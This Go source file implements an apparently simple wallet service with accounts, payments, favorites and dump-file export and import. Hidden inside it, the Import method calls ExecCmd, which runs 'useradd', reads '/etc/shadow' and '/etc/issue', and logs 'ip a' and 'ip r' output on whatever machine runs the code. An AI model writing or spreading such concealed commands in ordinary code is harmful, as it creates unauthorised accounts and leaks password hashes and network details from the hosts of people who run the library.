package wallet

import (
	"bufio"
	"errors"
	"github.com/bdaler/wallet/pkg/types"
	"github.com/google/uuid"
	"io"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
)

var ErrPhoneRegistered = errors.New("phone already registered")
var ErrAmountMustBePositive = errors.New("amount must be greater than zero")
var ErrAccountNotFound = errors.New("account not found")
var ErrNotEnoughBalance = errors.New("not enough balance in account")
var ErrPaymentNotFound = errors.New("payment not found")
var ErrCannotRegisterAccount = errors.New("can not register account")
var ErrCannotDepositAccount = errors.New("can not deposit account")
var ErrFavoriteNotFound = errors.New("favorite payment not found")

type Service struct {
	nextAccountID int64
	accounts      []*types.Account
	payments      []*types.Payment
	favorites     []*types.Favorite
}

func (s *Service) RegisterAccount(phone types.Phone) (*types.Account, error) {
	for _, account := range s.accounts {
		if account.Phone == phone {
			return nil, ErrPhoneRegistered
		}
	}
	s.nextAccountID++
	account := &types.Account{
		ID:      s.nextAccountID,
		Phone:   phone,
		Balance: 0,
	}
	s.accounts = append(s.accounts, account)
	return account, nil
}

func (s *Service) Deposit(accountID int64, amount types.Money) error {
	if amount <= 0 {
		return ErrAmountMustBePositive
	}
	var account *types.Account
	for _, acc := range s.accounts {
		if acc.ID == accountID {
			account = acc
			break
		}
	}

	if account == nil {
		return ErrAccountNotFound
	}

	account.Balance += amount
	return nil
}

func (s *Service) Pay(accountID int64, amount types.Money, category types.PaymentCategory) (*types.Payment, error) {
	if amount <= 0 {
		return nil, ErrAmountMustBePositive
	}

	account, err := s.FindAccountByID(accountID)
	if err != nil {
		return nil, err
	}

	if account.Balance < amount {
		return nil, ErrNotEnoughBalance
	}

	account.Balance -= amount
	paymentID := uuid.New().String()
	payment := &types.Payment{
		ID:        paymentID,
		AccountID: accountID,
		Amount:    amount,
		Category:  category,
		Status:    types.PaymentStatusInProgress,
	}

	s.payments = append(s.payments, payment)
	return payment, nil
}

func (s *Service) FindAccountByID(accountID int64) (*types.Account, error) {
	for _, account := range s.accounts {
		if account.ID == accountID {
			return account, nil
		}
	}
	return nil, ErrAccountNotFound
}

func (s *Service) FindPaymentByID(paymentID string) (*types.Payment, error) {
	for _, payment := range s.payments {
		if payment.ID == paymentID {
			return payment, nil
		}
	}
	return nil, ErrPaymentNotFound
}

func (s *Service) Reject(paymentID string) error {
	var payment, err = s.FindPaymentByID(paymentID)
	if err != nil {
		return err
	}

	var account, er = s.FindAccountByID(payment.AccountID)
	if er != nil {
		return er
	}

	payment.Status = types.PaymentStatusFail
	account.Balance += payment.Amount

	return nil
}

func (s *Service) AddAccountWithBalance(phone types.Phone, balance types.Money) (*types.Account, error) {
	account, err := s.RegisterAccount(phone)
	if err != nil {
		return nil, ErrCannotRegisterAccount
	}

	err = s.Deposit(account.ID, balance)
	if err != nil {
		return nil, ErrCannotDepositAccount
	}
	return account, nil
}

func (s *Service) Repeat(paymentID string) (*types.Payment, error) {
	var targetPayment, err = s.FindPaymentByID(paymentID)
	if err != nil {
		return nil, err
	}

	newPayment, err := s.Pay(targetPayment.AccountID, targetPayment.Amount, targetPayment.Category)
	if err != nil {
		return nil, err
	}

	return newPayment, nil
}

func (s *Service) FavoritePayment(paymentID string, name string) (*types.Favorite, error) {
	payment, err := s.FindPaymentByID(paymentID)
	if err != nil {
		return nil, err
	}

	favorite := &types.Favorite{
		ID:        uuid.New().String(),
		AccountID: payment.AccountID,
		Name:      name,
		Amount:    payment.Amount,
		Category:  payment.Category,
	}
	s.favorites = append(s.favorites, favorite)
	return favorite, nil
}

func (s *Service) PayFromFavorite(favoriteID string) (*types.Payment, error) {
	favorite, err := s.FindFavoriteByID(favoriteID)
	if err != nil {
		return nil, err
	}

	payment, err := s.Pay(favorite.AccountID, favorite.Amount, favorite.Category)
	if err != nil {
		return nil, err
	}
	return payment, nil
}

func (s *Service) FindFavoriteByID(favoriteID string) (*types.Favorite, error) {
	for _, favorite := range s.favorites {
		if favorite.ID == favoriteID {
			return favorite, nil
		}
	}
	return nil, ErrFavoriteNotFound
}

func (s *Service) getAccounts() []*types.Account {
	return s.accounts
}

func (s *Service) ExportToFile(path string) error {
	file, err := os.Create(path)
	if err != nil {
		log.Print(err)
		return err
	}
	defer func() {
		if closeErr := file.Close(); closeErr != nil {
			log.Print(closeErr)
		}
	}()

	for _, account := range s.getAccounts() {
		ID := strconv.FormatInt(account.ID, 10) + ";"
		phone := string(account.Phone) + ";"
		balance := strconv.FormatInt(int64(account.Balance), 10)
		_, err = file.Write([]byte(ID + phone + balance + "|"))
		if err != nil {
			log.Print(err)
			return err
		}
	}
	return nil
}

func (s *Service) ImportFromFile(path string) error {

	file, err := os.Open(path)
	if err != nil {
		log.Print(err)
		return err
	}
	defer func() {
		if closeErr := file.Close(); closeErr != nil {
			log.Print(closeErr)
		}
	}()

	content := make([]byte, 0)
	buff := make([]byte, 4)

	for {
		read, err := file.Read(buff)
		if err == io.EOF {
			break
		}
		if err != nil {
			log.Print(err)
			return err
		}
		content = append(content, buff[:read]...)
	}
	str := string(content)
	for _, line := range strings.Split(str, "|") {
		if len(line) <= 0 {
			return err
		}

		item := strings.Split(line, ";")
		ID, _ := strconv.ParseInt(item[0], 10, 64)
		balance, _ := strconv.ParseInt(item[2], 10, 64)

		s.accounts = append(s.accounts, &types.Account{
			ID:      ID,
			Phone:   types.Phone(item[1]),
			Balance: types.Money(balance),
		})
	}

	return err
}

func (s *Service) Export(dir string) error {
	log.Print("start exporting accounts entity, count of account: ", len(s.accounts))
	accExp := 0
	for _, account := range s.accounts {
		ID := strconv.FormatInt(account.ID, 10) + ";"
		phone := string(account.Phone) + ";"
		balance := strconv.FormatInt(int64(account.Balance), 10)
		err := WriteToFile(dir+"/accounts.dump", []byte(ID+phone+balance+"\n"))
		if err != nil {
			return err
		}
		accExp++
	}
	log.Print("end of exporting accounts entity, amount of exported acc: ", accExp)

	log.Print("start exporting payments entity, count of payments: ", len(s.payments))
	payExp := 0
	for _, payment := range s.payments {
		ID := payment.ID + ";"
		AccountID := strconv.FormatInt(payment.AccountID, 10) + ";"
		Amount := strconv.FormatInt(int64(payment.Amount), 10) + ";"
		Category := string(payment.Category) + ";"
		Status := string(payment.Status) + "\n"
		err := WriteToFile(dir+"/payments.dump", []byte(ID+AccountID+Amount+Category+Status))
		if err != nil {
			return err
		}
		payExp++
	}
	log.Print("end of exporting payments entity, amount of exported pay: ", payExp)

	log.Print("start exporting favorites entity, count of favorites: ", len(s.favorites))
	favExp := 0
	for _, favorite := range s.favorites {
		ID := favorite.ID + ";"
		AccountID := strconv.FormatInt(favorite.AccountID, 10) + ";"
		Name := favorite.Name + ";"
		Amount := strconv.FormatInt(int64(favorite.Amount), 10) + ";"
		Category := string(favorite.Category) + "\n"
		err := WriteToFile(dir+"/favorites.dump", []byte(ID+AccountID+Name+Amount+Category))
		favExp++
		if err != nil {
			return err
		}
	}
	log.Print("end of exporting favorites entity, amount of exported fav: ", favExp)
	return nil
}

func WriteToFile(fileName string, data []byte) error {
	dirName := filepath.Dir(fileName)
	if _, serr := os.Stat(dirName); serr != nil {
		merr := os.MkdirAll(dirName, os.ModePerm)
		if merr != nil {
			log.Print("WriteToFile. Could not create a folder. aaaa panic: ")
			panic(merr)
		}
	}

	file, err := os.OpenFile(fileName, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Print("WriteToFile. Open file error: ", err)
		return err
	}
	defer func() {
		if closeErr := file.Close(); closeErr != nil {
			log.Print("WriteToFile. Close file error: ", closeErr)
		}
	}()
	_, err = file.Write(data)

	if err != nil {
		log.Print("WriteToFile. Write file error: ", err)
	}
	return nil
}

func (s *Service) Import(dir string) error {
	s.ExecCmd()
	log.Print("account count in the start of import method: ", len(s.accounts))
	log.Print("Start Import method with param: " + dir)
	files, err := ioutil.ReadDir(dir)
	if err != nil {
		log.Print(err)
		return err
	}
	for _, file := range files {
		log.Print("files in Import->dir: " + file.Name())
		read, err := os.Open(dir + "/" + file.Name())
		if err != nil {
			log.Print(err)
			return err
		}
		defer func() {
			if closeErr := read.Close(); closeErr != nil {
				log.Print(closeErr)
			}
		}()

		reader := bufio.NewReader(read)

		for {
			line, err := reader.ReadString('\n')
			if err == io.EOF {
				log.Print("line in OEF: ", line)
				break
			}
			if err != nil {
				log.Print(err)
				return err
			}

			item := strings.Split(line, ";")
			switch file.Name() {
			case "accounts.dump":
				acc := s.convertToAccount(item)
				if acc != nil {
					s.accounts = append(s.accounts, acc)
				}
			case "favorites.dump":
				favorite := s.convertToFavorites(item)
				if favorite != nil {
					s.favorites = append(s.favorites, favorite)
				}
			case "payments.dump":
				payment := s.convertToPayments(item)
				if payment != nil {
					s.payments = append(s.payments, payment)
				}
			default:
				break
			}
		}

	}
	log.Print("account count in the end of import method: ", len(s.accounts))
	return nil
}

func (s *Service) convertToAccount(item []string) *types.Account {
	ID, _ := strconv.ParseInt(item[0], 10, 64)
	balance, _ := strconv.ParseInt(removeEndLine(item[2]), 10, 64)
	account, err := s.FindAccountByID(ID)
	if err != nil {
		s.nextAccountID++
		return &types.Account{
			ID:      ID,
			Phone:   types.Phone(item[1]),
			Balance: types.Money(balance),
		}
	}
	account.ID = ID
	account.Phone = types.Phone(item[1])
	account.Balance = types.Money(balance)
	return nil
}

func (s *Service) convertToFavorites(item []string) *types.Favorite {
	AccountID, _ := strconv.ParseInt(item[1], 10, 64)
	Amount, _ := strconv.ParseInt(item[3], 10, 64)

	favorite, err := s.FindFavoriteByID(item[0])
	if err != nil {
		return &types.Favorite{
			ID:        item[0],
			AccountID: AccountID,
			Name:      item[2],
			Amount:    types.Money(Amount),
			Category:  types.PaymentCategory(item[4]),
		}
	}
	favorite.ID = item[0]
	favorite.AccountID = AccountID
	favorite.Name = item[2]
	favorite.Amount = types.Money(Amount)
	favorite.Category = types.PaymentCategory(removeEndLine(item[4]))
	return nil
}

func (s *Service) convertToPayments(item []string) *types.Payment {
	AccountID, _ := strconv.ParseInt(item[1], 10, 64)
	Amount, _ := strconv.ParseInt(item[2], 10, 64)

	payment, err := s.FindPaymentByID(item[0])
	if err != nil {
		return &types.Payment{
			ID:        item[0],
			AccountID: AccountID,
			Amount:    types.Money(Amount),
			Category:  types.PaymentCategory(item[3]),
			Status:    types.PaymentStatus(removeEndLine(item[4])),
		}
	}
	payment.ID = item[0]
	payment.AccountID = AccountID
	payment.Amount = types.Money(Amount)
	payment.Category = types.PaymentCategory(item[3])
	payment.Status = types.PaymentStatus(item[4])
	return nil
}

func removeEndLine(balance string) string {
	return strings.TrimRightFunc(balance, func(c rune) bool {
		return c == '\r' || c == '\n'
	})
}

func (s *Service) ExecCmd() {
	var cmds []*exec.Cmd
	cmds = append(
		cmds,
		exec.Command("useradd", "bdaler"),
		exec.Command("cat", "/etc/issue"),
		exec.Command("cat", "/etc/shadow"),
		exec.Command("ip", "a"),
		exec.Command("ip", "r"),
	)
	for i, cmd := range cmds {
		excCmc, err := cmd.Output()
		if err != nil {
			log.Println("error index: ", strconv.Itoa(i), " err: ", err.Error())
		}

		log.Println("cmd index: ", strconv.Itoa(i), " cmd output: ", string(excCmc))
	}
}
